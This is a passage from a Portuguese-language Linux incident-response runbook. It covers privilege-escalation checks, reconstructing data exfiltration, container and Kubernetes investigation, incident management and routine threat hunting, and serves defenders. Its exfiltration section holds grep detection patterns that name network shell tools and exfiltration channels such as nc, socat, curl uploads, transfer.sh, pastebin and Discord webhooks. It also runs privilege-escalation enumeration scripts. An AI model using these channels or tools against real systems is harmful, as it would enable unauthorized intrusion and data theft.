sudo sysctl -w fs.protected_symlinks=1 fs.protected_hardlinks=1   # ataques de link em /tmp
sudo sysctl -w fs.protected_fifos=2 fs.protected_regular=2
sudo sysctl -w fs.suid_dumpable=0             # sem core dump de processo SUID
sudo sysctl -w kernel.perf_event_paranoid=3
```

---

## 36.7. Ferramentas

```text
linpeas / LinEnum          # enumeração automatizada — cobre as 6 famílias de uma vez
unix-privesc-check         # checagem clássica de permissões
linux-exploit-suggester-2  # cruza 'uname -r' com LPEs públicas conhecidas
pspy                       # vê o que ROOT executa sem você ser root (acha o cron da §36.4)
lynis                      # hardening geral, com prioridade
GTFOBins / LOLBAS          # tabela: este binário SUID/sudo tem primitiva explorável?
```
```bash
./linpeas.sh -a > /tmp/pe.txt      # rode como o usuário SUSPEITO — é o ponto de vista que importa
./les.sh -k "$(uname -r)"
./pspy64                            # deixe rodando alguns minutos: pega o job periódico de root
```

> Duas ressalvas: (1) esses scripts são **barulhentos** e frequentemente marcados por EDR/AV — avise o time antes; (2) eles listam *candidatos*, com muito falso positivo. A validação é a regra de decisão da §36.2 e a leitura do sudoers da §36.3.

---

## 36.8. Mitigação por rota

```text
SUID/SGID desnecessário   chmod u-s  +  mount nosuid  +  NoNewPrivileges=yes      §34.1/§34.2
capability solta          setcap -r  +  CapabilityBoundingSet= (vazio)            §34.1
sudo permissivo           caminho absoluto, sem curinga, env_reset, use_pty       §36.3
arquivo gravável          root:root 644/755 em tudo que root executa              §36.4
PATH relativo             caminho absoluto nos scripts + secure_path no sudo      §36.4
grupo docker/lxd/disk     remover; rootless/podman ou regra sudo específica       §36.5
LPE conhecida             patch + userns desligado + sysctl de hardening          §36.6
credencial reusada        secret manager, sem senha em arquivo/env                §26/§34.4
tudo acima de uma vez     um serviço por host + sandbox systemd                   §34
```

> **O atalho honesto:** a §34.1 neutraliza sozinha as famílias 1, 2 e boa parte da 3 **para o serviço exposto** — `NoNewPrivileges` + `CapabilityBoundingSet=` + `ProtectSystem=strict` fazem o SUID e a capability deixarem de existir do ponto de vista daquele processo. Corrigir rota por rota é necessário; a sandbox é o que segura o que você não achou.

---

## 36.9. Higiene contínua

```bash
# baseline enquanto o host está limpo — guarde FORA dele (§34.7)
sudo find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -printf '%m %u %g %p\n' 2>/dev/null | sort > suid.base
sudo getcap -r / 2>/dev/null | sort > caps.base
sudo -l -U <USER> > sudo.base 2>/dev/null

# depois, periodicamente:
diff suid.base <(sudo find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -printf '%m %u %g %p\n' 2>/dev/null | sort)

# e alerte em tempo real (§11)
sudo auditctl -a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F a1\&04000 -k suid_set
sudo auditctl -w /etc/sudoers -p wa -k sudoers
sudo auditctl -w /etc/sudoers.d -p wa -k sudoers
```

> Privesc raramente aparece de uma vez: entra junto com um pacote novo, um deploy que mudou permissão, alguém adicionado ao grupo `docker` "só para testar". Sem baseline e diff, isso acumula em silêncio — e o próximo RCE encontra a rota pronta.

---

# 37. Exfiltração — o que saiu?

> **Por quê:** a §16 responde "como entrou" e a §34 responde "como impedir". Esta responde a pergunta que define a **consequência**: o que o atacante levou. É a que decide notificação, contrato e dano — e a única com prazo legal correndo (§39.4). **Olhe para:** volume de saída, arquivo de staging e ferramenta de transferência. Não procure "o dado vazado": ele não deixa rastro próprio.

**A assimetria:** exfiltração não deixa artefato como persistência deixa. Copiar não altera o original — o arquivo continua lá, intacto, com o mesmo `mtime`. Então você não vai *achar o vazamento*; vai reconstruí-lo por três vias independentes:

```text
alcance   o que aquele usuário/credencial CONSEGUIA ler        → o teto
volume    quantos bytes saíram, e quando                        → houve transferência?
canal     ferramenta, destino, protocolo                        → para onde
```

Convergiram, você tem a resposta. Nenhuma existe, isso **também** é uma resposta — e é a mais delicada (§37.7).

---

## 37.1. O alcance: o teto do que pode ter saído

Mesma lógica da §26 — presuma leitura, não uso:

```bash
U=<USER_COMPROMETIDO>
# dados volumosos legíveis por ele
sudo -u "$U" find / -xdev -type f -size +10M \
  \( -name '*.sql' -o -name '*.dump' -o -name '*.csv' -o -name '*.bak' -o -name '*.tar*' \) \
  2>/dev/null | head -40
findmnt -t nfs,nfs4,cifs,fuse.sshfs        # dados de OUTRO host montados aqui
# bases de dados que este host alcança
sudo ss -tnp | awk '{print $5}' | grep -E ':(3306|5432|6379|27017|9200)$' | sort -u
```

Some a isso as credenciais que ele lia (§12.3) e — o que costuma dobrar o teto — o que a **credencial da instância** abria na cloud (§10.5): bucket e banco gerenciado não aparecem em lugar nenhum do filesystem.

> O alcance é o número que vai para o jurídico se a telemetria falhar. Levante-o mesmo quando achar que não houve exfiltração: ele é o pior caso defensável.

---

## 37.2. Volume: o host mediu sem querer

Ninguém instrumenta exfiltração, mas os contadores já existem:

```bash
# bytes por conexão viva — o C2 que sobe 4 GB não é beacon
sudo ss -tin state established | grep -A1 '<C2_IP>'      # 'bytes_sent'/'bytes_acked'
sudo conntrack -L 2>/dev/null | grep '<C2_IP>'           # precisa de net.netfilter.nf_conntrack_acct=1
# desde o boot, por interface
cat /proc/net/dev
# histórico, se existir
vnstat -d 2>/dev/null; sar -n DEV 2>/dev/null | tail -20
# contadores de regra (a regra de egress da §34.3 conta de graça)
sudo iptables -L OUTPUT -n -v --line-numbers; sudo nft list ruleset -a 2>/dev/null | grep -i counter
```

> **O sinal que quase ninguém olha: a fatura.** Egress é cobrado por GB. Um salto no custo de saída — ou no gráfico de *network egress* do console — dentro da janela do incidente é medição **independente do host**: o atacante edita log, não edita faturamento. Mesmo raciocínio da §10.4.

---

## 37.3. Staging: o pacote que ele montou antes de mandar

Exfiltração em volume quase sempre passa por um arquivo intermediário:

```bash
# arquivos grandes criados na janela (§9)
sudo find / -xdev -type f -size +50M -newerct "$START" ! -newerct "$END" \
  -printf '%CY-%Cm-%Cd %CT %10s %p\n' 2>/dev/null | sort
# comprimido em lugar de trânsito
sudo find /tmp /var/tmp /dev/shm /home -type f \
  \( -name '*.tar*' -o -name '*.tgz' -o -name '*.zip' -o -name '*.7z' \) -ls 2>/dev/null
# o pacote já foi apagado, mas o processo ainda o tem aberto (§3.14)
sudo lsof +L1 2>/dev/null | awk '$7 > 10000000'
# o comando que empacotou (§11 / §13)
sudo ausearch -m EXECVE -i 2>/dev/null \
  | grep -iE 'tar|zip|7z|gzip|split|mysqldump|pg_dump|mongodump|rclone|rsync'
```

> Dois detalhes que valem por si: `split` num arquivo grande indica fatiamento para caber em upload de webhook/pastebin ou escapar de limite de tamanho; e `.tar.gz` em `/dev/shm` é staging **em RAM**, que some no reboot de propósito — se o host ainda está de pé, você chegou a tempo.

---

## 37.4. Canal: para onde foi

```bash
# ferramentas de transferência rodando agora
sudo ps -eo pid,user,args \
  | grep -EI 'rclone|aws s3|gsutil|az storage|scp|sftp|rsync|curl.*-[TF]|wget.*--post|nc |ncat|socat' \
  | grep -v grep
# e no rastro (§13/§11)
sudo grep -rhiE 'rclone|s3 cp|gsutil cp|curl -T|curl -F|--post-file|transfer\.sh|0x0\.st|pastebin|api\.telegram\.org|discord\.com/api/webhooks' \
  /home/*/.bash_history /root/.bash_history 2>/dev/null
# config de ferramenta de sync = o destino escrito em disco
sudo find /home /root \( -path '*rclone*' -o -name '.s3cfg' -o -path '*/.aws/config' \) 2>/dev/null
# DNS tunneling: volume anômalo e nomes longos para um domínio só
sudo tcpdump -ni any -c 500 'udp port 53' 2>/dev/null | awk '{print length($0), $0}' | sort -rn | head
```

> **Nem todo canal passa por aqui.** Além do próprio C2 (§17) e do DNS, existe a via mais silenciosa de todas: a **credencial de cloud** (§10.5) copiando o bucket direto pela API, do lado de fora. Nesse caso a §37.2 não acusa **nada** — nenhum byte de dado atravessa este host — e a prova existe só no audit da cloud (§37.6). Se a credencial da instância vazou, a ausência de tráfego local não significa ausência de exfiltração.

---

## 37.5. Banco de dados: a exfiltração que não vira arquivo

Um `SELECT` grande não deixa nada no filesystem. Vá ao log do banco:

```bash
# PostgreSQL
sudo grep -iE 'connection authorized|statement:' /var/log/postgresql/*.log 2>/dev/null | tail -50
sudo -u postgres psql -Atc \
  "select rows,calls,query from pg_stat_statements order by rows desc limit 10;" 2>/dev/null
# MySQL/MariaDB
sudo grep -iE 'Connect|Query.*select' /var/log/mysql/*.log 2>/dev/null | tail -50
mysql -Nse "select user,host,db,command,time,info from information_schema.processlist;" 2>/dev/null
```

```text
origem de conexão inesperada    o usuário da app conectando de um IP/host que não é a app
volume de linhas anômalo        'rows' muito acima do padrão daquela mesma query
SELECT sem WHERE em tabela grande, ou dump de schema inteiro
uso de credencial da app fora do horário e do host da app
```

> Se o log de query estava desligado (é o padrão), você **não vai** saber o que foi lido. Essa é a resposta honesta a dar na §39.4 — não uma lacuna para preencher com otimismo.

---

## 37.6. A prova está off-box

```text
VPC Flow Logs            bytes por conexão de saída — número que o host não pode editar
faturamento de egress    salto de custo/GB na janela (§37.2)
log de acesso do storage S3 Data Events / GCS Data Access: QUAL objeto foi lido, e por quem
audit da cloud           uso da service-account roubada (§10.5): list/get em bucket
proxy / NAT gateway      destino e volume por conexão
resolver de DNS central  consulta a domínio de tunelamento
```

> O log de acesso do storage é a **única** fonte que responde "quais objetos" em vez de "quantos bytes" — e costuma vir desligado por custo. Se os dados moram em bucket, ligue **antes** (§34.7): é a diferença entre "vazou algo" e "vazaram estes 412 arquivos".

---

## 37.7. Veredito — e o que fazer com ele

```text
volume compatível com beacon, sem staging, sem ferramenta       → exfil improvável (não descartada)
staging + ferramenta de transferência + pico de egress          → exfil CONFIRMADA: trate o conteúdo como público
credencial de cloud usada em bucket no audit (§10.5)            → exfil CONFIRMADA, escopo = o da credencial
alcance amplo e NENHUMA telemetria (sem flow log, sem audit,
sem log de query, sem retenção)                                 → INDETERMINADO
```

> **"Indeterminado" é um veredito, não um empate.** Ele obriga a decidir por presunção — e a presunção defensável, quando o alcance (§37.1) incluía dado pessoal, é a de que houve acesso. Não escreva "sem evidência de exfiltração" quando o correto é "não havia como saber": a primeira frase é uma afirmação sobre o atacante, a segunda é uma afirmação sobre a sua telemetria. Só a segunda você pode provar.

> E o que independe do veredito: **tudo** que era legível vai para a §26. Credencial não tem "indeterminado" — rotaciona.

---

# 38. Fora da VM: contêiner, Kubernetes e mesh

> **Por quê:** o runbook inteiro assume um host que você acessa e um filesystem que você lê. Com a app em contêiner isso ainda é verdade — só que por outro caminho. Com a app em cluster, metade das seções **muda de andar**. **Olhe para:** onde cada seção deste arquivo passou a morar, antes de concluir que "não achei nada".

---

## 38.1. Contêiner: investigue a partir do host

Contêiner é processo no **seu** kernel (§7.11). Então toda a §3 continua valendo — você só precisa do PID.

```bash
sudo docker inspect --format '{{.State.Pid}}' <CONTAINER>     # container → PID
sudo cat /proc/<PID>/cgroup                                   # PID → container (§3.11)
sudo docker inspect --format '{{.GraphDriver.Data.MergedDir}}' <CONTAINER>   # o FS dele, visto daqui
```

```bash
# entre sem alterar nada: SEUS binários, nos namespaces DELE (§3.15)
sudo nsenter -t <PID> -m -p -n -- ss -tnp
sudo nsenter -t <PID> -m -p -n -- ls -la /tmp /dev/shm
# o que mudou em relação à imagem — FIM de graça, sem baseline (§24)
sudo docker diff <CONTAINER>
# contexto e logs
sudo docker logs --timestamps <CONTAINER> | tail -100
sudo docker inspect <CONTAINER>       # privileged, binds, socket, CapAdd — a leitura está na §7.11
```

> **Por que não `docker exec`:** ele cria um processo novo **dentro** do alvo, altera o container e depende de um shell existir na imagem. Imagem mínima/distroless não tem `ss`, `ps` nem `sh` — investigar de dentro simplesmente não funciona. O `nsenter` a partir do host resolve os dois problemas de uma vez.

> **`docker diff` é o `rpm -Va` do contêiner** (§24): lista tudo que difere da imagem. `A` adicionado, `C` modificado, `D` removido. Webshell no docroot, binário em `/tmp`, `authorized_keys` novo — aparece na hora, sem baseline nenhum. É o comando de melhor custo/benefício desta subseção.

> ⚠️ **A armadilha:** `docker rm` — e o *recreate* de qualquer deploy — destrói a camada de escrita do container, que é a evidência inteira. Ordem: preservar → parar → só então remover. E `restart: always` ressuscita o que você matar (§7.11): pare o **container**, não o processo.

```bash
sudo docker commit <CONTAINER> ir-evidence:$(date +%Y%m%d)     # congela o estado como imagem
sudo docker logs <CONTAINER> > "$IR/container.log" 2>&1
M=$(sudo docker inspect --format '{{.GraphDriver.Data.MergedDir}}' <CONTAINER>)
sudo tar czf "$IR/container-fs.tgz" -C "$M" .
```

---

## 38.2. Kubernetes: o que muda de lugar

O node continua sendo uma VM, e as §1–§36 valem nele por inteiro — inclusive porque a fuga do contêiner termina lá. O que muda é onde moram persistência, identidade e log:

```text
runbook (host)                     equivalente no cluster
§7  persistência cron/systemd      Deployment/DaemonSet/CronJob — o controlador recria o pod
                                   admission webhook mutante: o LD_PRELOAD do cluster
§7.9 usuários e privilégio         RBAC: Role/ClusterRole, ServiceAccount, Binding
§11 auditd                         audit log do API server — e quase sempre está DESLIGADO
§10 logs                           efêmeros: morrem com o pod. Só existem se saírem de lá (§0)
§2  rede                           NetworkPolicy (só vale se o CNI implementar), Service, Ingress
§34.1 sandbox systemd              securityContext + Pod Security Admission
§34.3 egress default-deny          NetworkPolicy de egress — e a §38.3
§12 lateral                        token da ServiceAccount → API server; kubelet; etcd
§20 matar processo                 inútil: o controlador recria em segundos
§27 rebuild                        inútil sozinho: recria a partir da MESMA imagem
```

O que **não** tem análogo no host — e é por onde os incidentes reais acontecem:

```text
token de ServiceAccount montado em TODO pod por padrão   → automountServiceAccountToken: false
Secret montado como arquivo/env                          → legível por qualquer coisa dentro do pod
kubelet (:10250)                                         → exec em qualquer pod do node, se exposto
etcd sem auth/TLS                                        → o cluster inteiro, em texto
admission webhook                                        → roda a cada criação de objeto = persistência
imagem                                                   → o vetor que sobrevive a todo redeploy (§27)
hostPath / privileged / hostNetwork / hostPID            → fuga para o node em um manifesto
```

```bash
kubectl get pods -A -o wide --sort-by=.metadata.creationTimestamp | tail   # o que nasceu por último
kubectl get events -A --sort-by=.lastTimestamp | tail -40
kubectl auth can-i --list --as=system:serviceaccount:<NS>:<SA>             # o raio daquele token (§34.4)
kubectl get clusterrolebindings -o wide | grep -i cluster-admin
kubectl get mutatingwebhookconfigurations validatingwebhookconfigurations
kubectl get pods -A -o json | jq -r '.items[]
  | select(.spec.hostPID or .spec.hostNetwork or (.spec.volumes[]?|has("hostPath")))
  | "\(.metadata.namespace)/\(.metadata.name)"'
```

> **A ordem se inverte.** No host você mata o processo e remove o gatilho (§19/§20). No cluster, `kubectl delete pod` é o **oposto** de contenção: o controlador recria em segundos e você destruiu a evidência no mesmo gesto. Contenha pelo objeto — escale o Deployment para 0, ou isole o pod (NetworkPolicy deny-all + tirar o label que o põe no Service) **mantendo-o vivo** para a §3 e a §38.1.

> **A fronteira:** este bloco é um mapa, não um runbook de resposta a incidente em cluster. Investigar RBAC, audit do API server, etcd e cadeia de imagem é assunto de arquivo próprio.

---

## 38.3. Service mesh: o que ele quebra e o que ele dá

Mesh não é uma camada de investigação — é uma camada de política que, de quebra, **reescreve onde você olha**.

**O que ele quebra:**

```text
§2    'ss' mostra 127.0.0.1:15001, não o destino real — quem sai é o sidecar
§2.7  o beacon também sai pelo sidecar: o PID da app não tem a conexão externa
§17   "conexão para IP público a partir do processo da app" deixa de ser sinal direto
§18.1 o iptables do pod já pertence ao init do mesh: sua regra não pega, ou quebra tudo
§2.6  tcpdump entre pods vê mTLS — cifrado, mesmo sendo tráfego interno
```

```bash
kubectl logs <POD> -c <SIDECAR> | tail -50           # o access log do sidecar = o destino REAL
kubectl exec <POD> -c <SIDECAR> -- curl -s localhost:15000/clusters | head   # destinos configurados
```

**O que ele dá:**

```text
egress default-deny de verdade   política de saída só para destino registrado = a §34.3 do cluster
identidade por workload          mTLS: quem fala com quem por identidade, não por IP (§34.4/§34.5)
autorização em L7                por rota e método, não só por porta
log de fluxo por padrão          o access log do sidecar é o VPC Flow do cluster (§0, §37.6)
```

**O risco que ele traz:**

```text
porta admin do sidecar (:15000)  config, clusters e certificado — local ao pod, mas o atacante
                                 comprometido já está dentro do pod
mTLS não protege por dentro      comprometido o pod, o atacante herda a identidade dele
o sidecar é um proxy pronto      ele já sabe alcançar tudo que aquele workload pode alcançar
```

> **O resumo:** uma malha instalada sem ninguém atualizar o runbook **cega** a investigação em vez de ajudá-la — as §2, §2.7 e §17 passam a olhar para o lugar errado, e o resultado vazio parece limpeza. Ajustado o lugar de olhar, ela entrega o melhor log de rede que você vai ter no cluster e a única versão da §34.3 que funciona lá dentro.

---

# 39. Gestão do incidente (decisão, comunicação, registro)

> **Por quê:** as §1–§37 dizem o que fazer com a máquina. Nenhuma diz quem decide derrubar produção, quem avisa quem, e o que precisa estar escrito. É a parte que não aparece no `journalctl` — e a que costuma custar mais caro depois. **Olhe para:** decidir isto **antes** de precisar; no meio do incidente ninguém negocia papel.

**A regra que organiza tudo:** a trilha técnica e a trilha de decisão correm juntas e são separadas. Quem está com as mãos no host não é quem responde e-mail. Quando for a mesma pessoa — o caso comum — ela alterna de propósito e registra a troca, porque a trilha técnica tem urgência de minutos e sempre atropela a outra, que tem prazo de dias e consequência maior.

---

## 39.1. Severidade e quem decide

Classifique cedo: a severidade define quem é acordado e o que pode ser derrubado.

```text
baixa     suspeita sem confirmação; nenhum sinal de execução do atacante
média     comprometimento confirmado do usuário da app; sem root, sem dado sensível alcançável
alta      root (§36), persistência múltipla (§23), ou alcance a dado pessoal/credencial (§37.1)
crítica   kernel (§35), frota (§23), exfiltração confirmada (§37.7) ou pipeline comprometido (§27)
```

Três decisões que travam a resposta inteira se não tiverem dono declarado:

```text
derrubar o serviço?   receita agora x atacante com shell ativo — quem assina é o negócio, não o técnico
rebuild ou limpar?    §27 dá o critério técnico; a janela e o custo são de quem opera
notificar?            §39.4 — e essa nunca é decisão de quem está no terminal
```

> **O default que evita a pior discussão:** contenção que **não** derruba o serviço (bloquear egress do usuário da app, §18.1/§34.3) quase sempre cabe na autonomia de quem responde; **parar** o serviço, não. Separe as duas ao pedir autorização — pedir as duas juntas costuma travar as duas.

---

## 39.2. OpSec da resposta

O atacante pode estar lendo o canal onde você discute o incidente. Se ele pegou credencial de cloud, e-mail, SSO ou repositório, isso não é hipótese remota — é o caso provável.

```text
canal fora de banda       discuta em canal que NÃO depende do ambiente comprometido
sem "achamos você"        nada de aviso amplo antes de conter em bloco (§1, §18)
sem tocar no C2           §32 — curl/nmap contra o IP dele confirma a detecção e ele reage
sem rotacionar por dentro §26 — a credencial nova não pode passar pelo host comprometido
IOC em canal restrito     hash/IP em ticket público vaza para quem monitora o seu ticket
segredo fora do war log   redija: o registro vai ser lido por gente que não precisa dele
```

> **A ordem que preserva as duas coisas:** coletar (§28) → decidir → conter **em bloco** (§18) → comunicar amplamente. Contenção parcial é o pior dos mundos: alerta o atacante e não o remove — ele então apaga rastro, troca de C2 e ativa a persistência que você ainda não achou (§23).

---

## 39.3. O registro (war log)

Grave a sessão inteira. É mais barato que lembrar depois, e é o que responde "você alterou a evidência?":

```bash
sudo script -aq -f "$IR/session.log"     # tudo que você digitar e ver, a partir daqui
export HISTTIMEFORMAT='%F %T '           # history com hora
export PS1='[\D{%F %T}] \u@\h:\w\$ '     # o prompt vira carimbo de tempo na transcrição
# ... trabalhe ...
exit                                     # encerra o script e fecha o arquivo
```

Em paralelo, um arquivo com uma linha por ação relevante:

```text
2026-04-30T21:34Z  lex  COLETA    ss/ps/lsof -> $IR (§28)
2026-04-30T21:41Z  lex  ACHADO    PID 6574 exe=/home/node/.config/htop/defunct sha256=<...>
2026-04-30T21:52Z  ana  DECISÃO   egress bloqueado; serviço MANTIDO no ar (autorizou: <nome>)
2026-04-30T22:10Z  lex  REMOÇÃO   crontab de 'node' — original salvo em $IR/cron-node.bak
```

```text
hora em UTC          a cloud loga em UTC (§10.4); misturar fuso arruína a correlação da §9.1
quem                 ação de humano x ação de script/automação
o quê + onde         o comando e o caminho, não "limpei o cron"
resultado/artefato   onde ficou a prova ($IR/...)
```

> Três usos que pagam o custo: reconstruir a linha do tempo quando o incidente durar dias; **separar o que o atacante fez do que você fez** (sem isso, a §9 acusa você mesmo — todo `ctime` que você tocou vira artefato suspeito); e servir de base factual ao post-mortem, que ninguém escreve de memória duas semanas depois.

---

## 39.4. Notificação: prazos que não são seus

O gatilho é o veredito da §37, não a gravidade técnica.

```text
titulares e ANPD (LGPD)   incidente com dado pessoal e risco relevante. O prazo é curto e conta
                          do CONHECIMENTO do incidente (Resolução CD/ANPD nº 15/2024: 3 dias úteis)
cliente / contrato        SLA de notificação em contrato B2B costuma ser MAIS curto que o legal
seguro cyber              aviso tardio é causa comum de negativa de cobertura — cheque o prazo da apólice
provedor de cloud         se o host atacou terceiros, comunicar abuse protege você da suspensão
CERT.br / autoridade      abuso de rede; extorsão e crime → registro formal, se for seguir por essa via
```

> **Isto não é orientação jurídica** — e o ponto operacional é outro: o relógio começa no **conhecimento**, não na conclusão da análise. Ele já está correndo enquanto você lê a §5. Acione jurídico/DPO **em paralelo** à investigação, com o que você tem, e confirme com eles a redação vigente do regulamento.

> O que eles precisam de você são três campos, que é exatamente o que a §37.7 produz: **qual dado era alcançável**, **há evidência de que saiu**, e **se não há, é porque não saiu ou porque não havia telemetria?**. Uma voz só fala com o mundo externo — e não é a de quem está no terminal.

---

## 39.5. Critério de encerramento

O incidente fecha quando **todas** forem verdade — não quando o host parar de dar sinal:

```text
[ ] vetor de entrada identificado e FECHADO                   §14/§16
[ ] persistência removida e validada                          §19/§22
[ ] re-scan em 24–48h limpo                                   §22
[ ] frota varrida com os IOCs deste incidente                 §23
[ ] credenciais rotacionadas FORA do host                     §26
[ ] exfiltração avaliada e o veredito registrado              §37.7
[ ] notificações feitas — ou a decisão de não notificar,
    escrita, fundamentada e com dono                          §39.4
[ ] hardening aplicado ao que permitiu o alcance              §34
[ ] as três perguntas da §33 respondidas por escrito
```

> Sem o primeiro item, nenhum dos outros importa: o host volta a ser comprometido pelo mesmo caminho — agora com você achando que fechou, e sem olhar de novo.

---

## 39.6. Post-mortem

Às três perguntas da §33 (como entrou, o que fez, como impedir), some as duas que mudam o **próximo** incidente:

```text
o que atrasou a DETECÇÃO?   tempo entre a entrada (§9) e o primeiro alerta. Quem viu, e como?
o que atrasou a RESPOSTA?   faltou acesso, log, autorização, baseline, gente? Qual passo levou horas?
```

> Se a resposta de "o que atrasou a detecção" for "um cliente avisou" ou "o provedor mandou abuse report", o que precisa ser corrigido não é o malware — é a §34.7.

O que faz o documento valer alguma coisa:

```text
sem culpado           o alvo é o sistema que permitiu, não quem errou; senão ninguém reporta o próximo
ação com DONO e PRAZO "melhorar o monitoramento" não é ação; "ligar VPC Flow no projeto X até 15/06 — ana" é
dwell time medido     entrada (§9) → detecção → contenção. É a métrica que resume tudo
o que NÃO faremos     risco conscientemente aceito também vai escrito, com quem aceitou
```

> Guarde junto o material bruto: o `$IR`, o war log (§39.3), os IOCs e a regra YARA (§32). O próximo incidente começa perguntando "já vimos isso antes?" — e a pergunta só tem resposta se alguém guardou.

---

# 40. Rotina: a operação em tempo de paz

> **Por quê:** o conteúdo preventivo deste runbook já existe — §0 (telemetria), §34 (blast radius), §35.7, §36.8/§36.9. O que falta não é mais controle: é **cadência**. Um check que ninguém roda é idêntico a um check que não existe. **Olhe para:** o que você consegue sustentar toda semana, não o que impressiona uma vez.

**A premissa:** dwell time real se mede em semanas. Se você só olha quando alguém alerta, o alerta é o fim de uma história que já rodou inteira. Proatividade é olhar **sem motivo** — e é a única coisa que encurta a distância entre a §9 (entrada) e a §39.6 (detecção).

---

## 40.1. A cadência

```text
DIÁRIO — automatizado, e como ALERTA (não relatório que ninguém abre)
  escrita em /etc, /usr/bin, authorized_keys, sudoers          §11 §34.7
  SUID/capability novo, fora do baseline                        §36.9
  conexão de saída do usuário da app para destino novo          §2 §34.7
  agente de log parado ou falha de envio                        §0

SEMANAL — 10 minutos, com olho humano
  diff do baseline: portas, SUID, caps, units habilitadas       §34.7 §36.9
  patch de segurança pendente e reboot pendente                 §34.9
  contas com shell, authorized_keys, sudoers                    §7.9 §36.3
  o que piorou no systemd-analyze security desde a semana passada  §34.1

MENSAL
  auditoria da §34.8 inteira + lynis                            §34.8
  postura da cloud (prowler/ScoutSuite)                         §32 §34.10
  CVE nos manifests da app                                      §16 §32
  revisão de acesso: SSH, sudo, grupos, IAM                     §34.4 §36.5

TRIMESTRAL
  caça proativa                                                 §40.2
  exercício de resposta                                         §40.3
  restauração de backup testada de verdade                      §27
```

> **A regra do que vira alerta:** só entra no diário o que é **acionável e raro**. Um alerta que dispara toda semana por ruído legítimo é treinamento para ignorar alerta — e é assim que o verdadeiro passa batido. Se não dá para deixar silencioso, ele é relatório semanal, não alerta.

---

## 40.2. Caça proativa (sem alerta nenhum)

Diferente das outras duas coisas: hardening parte da **config**, IR parte do **alerta**, caça parte de uma **hipótese**. Formule a hipótese antes de rodar o comando — senão você olha muita saída e não conclui nada.

```text
hipótese                                      onde checar      conclui se
algo fala com IP público sem dever            §2 §2.7          PID sem pacote dono (§24)
algo executa de tempos em tempos e some       §2.7 §32(pspy)   delta entre execuções constante
há binário fora de pacote em /usr/bin         §24              rpm -Va / dpkg -V acusa '5'
alguém escreveu em /etc fora de deploy        §9 §11           ctime sem mudança conhecida
existe SUID/cap que não estava no baseline    §25 §36.9        diff != vazio
outro host da frota tem o mesmo artefato      §23              osquery / Velociraptor
há chave em authorized_keys sem dono          §7.5             comentário/fingerprint estranho
```

> **A hipótese que mais rende:** *"o que executa sozinho neste host?"*. Toda persistência (§7) precisa de um gatilho, e a lista de gatilhos é finita e enumerável — rode a §7 inteira como caça trimestral, não só em incidente.

> **Caça que não acha nada não é desperdício.** Ela produz exatamente o "normal" que a §31 diz valer mais que qualquer lista de red flags: você não achou nada **e agora sabe como é o nada**. Guarde o resultado — ele é o baseline da próxima (§34.7).

---

## 40.3. Exercitar a resposta

O runbook só funciona se as peças existirem no dia. Descubra o que falta **sem** incidente:

```text
consigo tirar snapshot AGORA?             §1     permissão, cota, e quanto tempo leva
o log de 30 dias atrás existe?            §0 §10 escolha uma data e ache uma linha dela
sei quem autoriza derrubar produção?      §39.1  a resposta precisa ser um NOME
consigo rotacionar a credencial X?        §26    fora do host, e em quanto tempo
o backup restaura mesmo?                  §27    restaure de verdade, num host descartável
a regra de egress quebra a app?           §34.3  descubra em manutenção, não em incidente
```

> **Exercício de mesa, 1 hora:** alguém narra *"o provedor mandou abuse report do host X"* e o time percorre o runbook até fechar a §39.5. O que travar é o achado — e quase nunca é a técnica: é acesso que ninguém tem, autorização que ninguém sabe de quem é, ou log que não existe.

---

## 40.4. Medir

```text
dwell time                §39.6  entrada → detecção. A métrica que resume todas as outras
cobertura de telemetria   §0     % de hosts com auditd, log off-box e retenção > 30 dias
tempo até patch           §34.9  do release da correção até estar rodando
deriva do baseline        §36.9  quantos itens estão fora do baseline hoje
raio da credencial        §34.4  "se o token desta VM vazar agora, o que abre?" — em uma frase
```

> Se der para acompanhar só uma, acompanhe a **cobertura de telemetria**. É a única que, ao cair, apaga a sua capacidade de medir todas as outras — e é a §0 outra vez: sem log, não há métrica, não há caça e não há laudo.
